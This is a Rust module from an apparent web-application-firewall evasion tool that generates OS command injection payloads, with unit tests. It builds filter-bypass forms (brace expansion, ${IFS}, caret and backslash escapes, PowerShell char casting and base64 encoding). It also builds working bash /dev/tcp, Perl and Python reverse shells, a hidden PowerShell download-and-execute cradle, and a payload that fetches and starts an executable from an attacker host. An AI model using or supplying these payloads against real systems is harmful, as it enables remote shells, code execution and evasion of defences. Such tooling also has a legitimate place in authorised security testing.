//! OS command injection comprehensive payload library.
//!
//! Wafrift's existing `grammar::cmd` generates valid shell commands.
//! This library generates the EVASION FORMS — shell-specific
//! quoting, expansion, and substitution tricks that defeat keyword
//! filters while preserving the semantic command.
//!
//! Three shells matter:
//!
//! 1. **bash / sh / zsh** (POSIX-y): brace expansion, `${IFS}`,
//!    `$@`, ANSI-C `$'...'`, backslash continuation, here-strings.
//! 2. **Windows cmd.exe**: `^` escape, `%...%` env-var nesting,
//!    `set /p`, FOR-loop substitution.
//! 3. **PowerShell**: `iex` (Invoke-Expression), backtick escape,
//!    `[char]` casting, base64-encoded `-EncodedCommand`.
//!
//! Coverage:
//!
//! - **Bash brace expansion** (`{a,b,c}` → `a b c` without
//!   intermediate space) → splits a blocked keyword.
//! - **`${IFS}` whitespace bypass** → defeats space-blocking WAFs.
//! - **Backslash quoting** (`c\at`) → strips to `cat` after parser.
//! - **ANSI-C `$'...'`** → embeds arbitrary bytes including NUL.
//! - **Variable indirection** (`a=ca;b=t;$a$b`) → no literal `cat`
//!   in the wire payload.
//! - **Backticks vs `$(...)`** for nested substitution.
//! - **Here-string `<<<`** for stdin redirection.
//! - **Tab as IFS** when space is blocked.
//! - **Windows `^` escape** (`c^a^t`) → strips to `cat` after cmd.
//! - **PowerShell base64-encoded payload** (`powershell -Enc <b64>`).
//! - **PowerShell `[char]` casting** for char-by-char keyword build.
//! - **Reverse shell shortcuts**: bash `/dev/tcp/`, ncat, perl one-liners.

use base64::Engine;

/// Bash brace expansion: splits a keyword. `{cat,/etc/passwd}`
/// expands to `cat /etc/passwd` without ever containing the literal
/// `cat ` (with space) in the source.
#[must_use]
pub fn bash_brace_expansion(command: &str, args: &[&str]) -> String {
    let mut parts: Vec<&str> = vec![command];
    parts.extend(args);
    format!("{{{}}}", parts.join(","))
}

/// `${IFS}` whitespace bypass. `cat${IFS}/etc/passwd` works in bash
/// because `${IFS}` defaults to whitespace.
#[must_use]
pub fn ifs_whitespace(parts: &[&str]) -> String {
    parts.join("${IFS}")
}

/// Tab variant for when even `${IFS}` is blocked. Tab is also
/// whitespace per bash.
#[must_use]
pub fn tab_whitespace(parts: &[&str]) -> String {
    parts.join("\t")
}

/// Backslash quoting: `c\at` parses identical to `cat` in bash.
/// Every alphabetic char becomes `\X` to defeat keyword grep.
#[must_use]
pub fn backslash_quoting(keyword: &str) -> String {
    let mut out = String::with_capacity(keyword.len() * 2);
    for c in keyword.chars() {
        if c.is_ascii_alphabetic() {
            out.push('\\');
        }
        out.push(c);
    }
    out
}

/// Single-quote splitting: `'ca't` parses as `cat`.
#[must_use]
pub fn single_quote_split(keyword: &str) -> String {
    let mut out = String::with_capacity(keyword.len() + 4);
    let mid = keyword.len() / 2;
    out.push_str(&keyword[..mid]);
    out.push_str("''");
    out.push_str(&keyword[mid..]);
    out
}

/// ANSI-C `$'...'` embedding for non-printable bytes (NUL, etc.).
#[must_use]
pub fn ansi_c_quoting(byte: u8) -> String {
    format!("$'\\x{:02x}'", byte)
}

/// Variable indirection: store command in a variable, then expand.
/// `a=c;b=at;$a$b /etc/passwd` runs `cat /etc/passwd`.
#[must_use]
pub fn variable_indirection(keyword: &str) -> String {
    let mid = keyword.len() / 2;
    format!(
        "a={};b={};$a$b",
        &keyword[..mid],
        &keyword[mid..]
    )
}

/// Backticks substitution.
#[must_use]
pub fn backtick_subst(inner: &str) -> String {
    format!("`{inner}`")
}

/// `$(...)` substitution.
#[must_use]
pub fn dollar_paren_subst(inner: &str) -> String {
    format!("$({inner})")
}

/// Here-string: feed `inner` to `command` as stdin. Defeats filters
/// that scan `argv`.
#[must_use]
pub fn here_string(command: &str, inner: &str) -> String {
    format!("{command} <<< {inner}")
}

/// Bash `/dev/tcp/` reverse shell. The most common one-liner.
#[must_use]
pub fn bash_dev_tcp(attacker_host: &str, attacker_port: u16) -> String {
    format!(
        "bash -i >& /dev/tcp/{attacker_host}/{attacker_port} 0>&1"
    )
}

/// Windows `^`-escape. `c^a^t` strips to `cat` in cmd.exe.
#[must_use]
pub fn windows_caret_escape(keyword: &str) -> String {
    let mut out = String::with_capacity(keyword.len() * 2);
    for c in keyword.chars() {
        if c.is_ascii_alphabetic() {
            out.push('^');
        }
        out.push(c);
    }
    out
}

/// Windows nested env-var: `%PATH:~10,3%` extracts a substring.
/// Useful to build a keyword from chars already in PATH.
#[must_use]
pub fn windows_substring_extract(env_var: &str, offset: usize, length: usize) -> String {
    format!("%{env_var}:~{offset},{length}%")
}

/// PowerShell `iex` Invoke-Expression with a remote download.
#[must_use]
pub fn ps_iex_download(attacker_url: &str) -> String {
    format!(
        "powershell -NoP -W hidden iex ((New-Object Net.WebClient).DownloadString('{attacker_url}'))"
    )
}

/// PowerShell base64-encoded payload. `command` is the operator's
/// PS code; output is `-EncodedCommand <b64>` ready to paste.
#[must_use]
pub fn ps_encoded_command(ps_code: &str) -> String {
    // PowerShell expects UTF-16LE bytes then base64.
    let utf16: Vec<u16> = ps_code.encode_utf16().collect();
    let mut bytes = Vec::with_capacity(utf16.len() * 2);
    for c in utf16 {
        bytes.push((c & 0xFF) as u8);
        bytes.push((c >> 8) as u8);
    }
    let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
    format!("powershell -EncodedCommand {b64}")
}

/// PowerShell `[char]` casting for char-by-char keyword build.
/// `[char]99+[char]97+[char]116` builds "cat" without the literal.
#[must_use]
pub fn ps_char_cast(keyword: &str) -> String {
    keyword
        .chars()
        .map(|c| format!("[char]{}", c as u32))
        .collect::<Vec<_>>()
        .join("+")
}

/// Perl one-liner reverse shell.
#[must_use]
pub fn perl_reverse_shell(host: &str, port: u16) -> String {
    format!(
        "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");}};'"
    )
}

/// Python one-liner reverse shell.
#[must_use]
pub fn python_reverse_shell(host: &str, port: u16) -> String {
    format!(
        "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{host}\",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'"
    )
}

/// One-shot fan-out: every cmd injection shape for one (command,
/// arg, host, port) — covers bash + Windows + PowerShell + reverse
/// shells.
#[must_use]
pub fn all_cmd_attacks(
    command: &str,
    arg: &str,
    attacker_host: &str,
    attacker_port: u16,
) -> Vec<(&'static str, String)> {
    vec![
        ("brace", bash_brace_expansion(command, &[arg])),
        ("ifs", ifs_whitespace(&[command, arg])),
        ("tab", tab_whitespace(&[command, arg])),
        ("backslash", backslash_quoting(command)),
        ("single-quote-split", single_quote_split(command)),
        ("var-indirection", variable_indirection(command)),
        ("backtick", backtick_subst(command)),
        ("dollar-paren", dollar_paren_subst(command)),
        ("here-string", here_string(command, arg)),
        ("bash-dev-tcp", bash_dev_tcp(attacker_host, attacker_port)),
        ("windows-caret", windows_caret_escape(command)),
        ("windows-substr", windows_substring_extract("PATH", 0, 3)),
        (
            "ps-iex",
            ps_iex_download(&format!("http://{attacker_host}:{attacker_port}/x")),
        ),
        (
            "ps-encoded",
            ps_encoded_command(&format!(
                "iwr http://{attacker_host}:{attacker_port}/x -OutFile $env:TEMP\\x.exe; start $env:TEMP\\x.exe"
            )),
        ),
        ("ps-char-cast", ps_char_cast(command)),
        (
            "perl-rev-shell",
            perl_reverse_shell(attacker_host, attacker_port),
        ),
        (
            "python-rev-shell",
            python_reverse_shell(attacker_host, attacker_port),
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn brace_expansion_basic() {
        let p = bash_brace_expansion("cat", &["/etc/passwd"]);
        assert_eq!(p, "{cat,/etc/passwd}");
    }

    #[test]
    fn brace_expansion_no_args() {
        let p = bash_brace_expansion("ls", &[]);
        assert_eq!(p, "{ls}");
    }

    #[test]
    fn ifs_whitespace_basic() {
        let p = ifs_whitespace(&["cat", "/etc/passwd"]);
        assert_eq!(p, "cat${IFS}/etc/passwd");
    }

    #[test]
    fn tab_whitespace_basic() {
        let p = tab_whitespace(&["cat", "/etc/passwd"]);
        assert_eq!(p, "cat\t/etc/passwd");
    }

    #[test]
    fn backslash_quoting_alphabetic() {
        let p = backslash_quoting("cat");
        assert_eq!(p, "\\c\\a\\t");
    }

    #[test]
    fn backslash_quoting_preserves_non_alpha() {
        let p = backslash_quoting("cat/etc");
        assert!(p.contains("/"));
        assert!(p.contains("\\c"));
    }

    #[test]
    fn single_quote_split_basic() {
        let p = single_quote_split("cat");
        // "ca" + "''" + "t" = "ca''t"
        assert_eq!(p, "ca''t");
    }

    #[test]
    fn single_quote_split_even_length() {
        let p = single_quote_split("CAT4");
        // "CA" + "''" + "T4"
        assert_eq!(p, "CA''T4");
    }

    #[test]
    fn ansi_c_quoting_basic() {
        let p = ansi_c_quoting(0x65); // 'e'
        assert_eq!(p, "$'\\x65'");
    }

    #[test]
    fn ansi_c_quoting_nul() {
        let p = ansi_c_quoting(0);
        assert_eq!(p, "$'\\x00'");
    }

    #[test]
    fn variable_indirection_basic() {
        let p = variable_indirection("cat");
        assert!(p.contains("a=c"));
        assert!(p.contains("b=at"));
        assert!(p.ends_with("$a$b"));
    }

    #[test]
    fn backtick_subst_basic() {
        let p = backtick_subst("id");
        assert_eq!(p, "`id`");
    }

    #[test]
    fn dollar_paren_basic() {
        let p = dollar_paren_subst("id");
        assert_eq!(p, "$(id)");
    }

    #[test]
    fn here_string_basic() {
        let p = here_string("base64 -d", "ZW5jcnlwdGVk");
        assert_eq!(p, "base64 -d <<< ZW5jcnlwdGVk");
    }

    #[test]
    fn bash_dev_tcp_format() {
        let p = bash_dev_tcp("10.0.0.1", 4444);
        assert!(p.contains("bash -i"));
        assert!(p.contains("/dev/tcp/10.0.0.1/4444"));
        assert!(p.contains("0>&1"));
    }

    #[test]
    fn windows_caret_escape_basic() {
        let p = windows_caret_escape("cat");
        assert_eq!(p, "^c^a^t");
    }

    #[test]
    fn windows_substring_extract_format() {
        let p = windows_substring_extract("PATH", 0, 3);
        assert_eq!(p, "%PATH:~0,3%");
    }

    #[test]
    fn ps_iex_format() {
        let p = ps_iex_download("http://x/y");
        assert!(p.contains("powershell"));
        assert!(p.contains("iex"));
        assert!(p.contains("http://x/y"));
    }

    #[test]
    fn ps_encoded_command_is_valid_base64() {
        let p = ps_encoded_command("echo hi");
        assert!(p.starts_with("powershell -EncodedCommand "));
        let b64_part = &p["powershell -EncodedCommand ".len()..];
        // Decoding succeeds.
        let decoded = base64::engine::general_purpose::STANDARD.decode(b64_part);
        assert!(decoded.is_ok());
    }

    #[test]
    fn ps_encoded_command_roundtrip_utf16le() {
        let p = ps_encoded_command("hi");
        let b64_part = &p["powershell -EncodedCommand ".len()..];
        let decoded = base64::engine::general_purpose::STANDARD.decode(b64_part).unwrap();
        // "hi" in UTF-16LE = h=0x68 0x00, i=0x69 0x00.
        assert_eq!(decoded, vec![0x68, 0x00, 0x69, 0x00]);
    }

    #[test]
    fn ps_char_cast_basic() {
        let p = ps_char_cast("cat");
        // c=99, a=97, t=116.
        assert_eq!(p, "[char]99+[char]97+[char]116");
    }

    #[test]
    fn perl_reverse_shell_format() {
        let p = perl_reverse_shell("10.0.0.1", 4444);
        assert!(p.starts_with("perl -e"));
        assert!(p.contains("10.0.0.1"));
        assert!(p.contains("4444"));
        assert!(p.contains("exec(\"sh -i\")"));
    }

    #[test]
    fn python_reverse_shell_format() {
        let p = python_reverse_shell("10.0.0.1", 4444);
        assert!(p.starts_with("python -c"));
        assert!(p.contains("10.0.0.1"));
        assert!(p.contains("4444"));
        assert!(p.contains("pty.spawn"));
    }

    #[test]
    fn all_cmd_attacks_minimum_count() {
        let v = all_cmd_attacks("cat", "/etc/passwd", "1.1.1.1", 4444);
        assert!(v.len() >= 14);
    }

    #[test]
    fn all_cmd_attacks_unique_names() {
        let v = all_cmd_attacks("ls", "/", "h", 80);
        let names: std::collections::HashSet<&&str> = v.iter().map(|(n, _)| n).collect();
        assert_eq!(names.len(), v.len());
    }

    #[test]
    fn all_cmd_attacks_carry_attacker_host() {
        let v = all_cmd_attacks("cmd", "arg", "UNIQUE_HOST", 12345);
        let any_carries = v.iter().any(|(_, p)| p.contains("UNIQUE_HOST"));
        assert!(any_carries);
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_cmd_attacks("cmd", "arg", "h", 80);
        let b = all_cmd_attacks("cmd", "arg", "h", 80);
        assert_eq!(a, b);
    }

    #[test]
    fn adversarial_long_command_no_panic() {
        let big = "a".repeat(10_000);
        let _ = bash_brace_expansion(&big, &[]);
        let _ = backslash_quoting(&big);
        let _ = ps_char_cast(&big);
        let _ = ps_encoded_command(&big);
    }

    #[test]
    fn handles_unicode_command() {
        let p = ps_char_cast("Ñ");
        assert!(p.contains("[char]"));
        // Unicode codepoint for Ñ = U+00D1 = 209.
        assert!(p.contains("209"));
    }

    #[test]
    fn backtick_with_inner_substitution() {
        let p = backtick_subst("`id`");
        // The backtick function doesn't escape inner backticks —
        // operator's responsibility.
        assert_eq!(p, "``id``");
    }
}
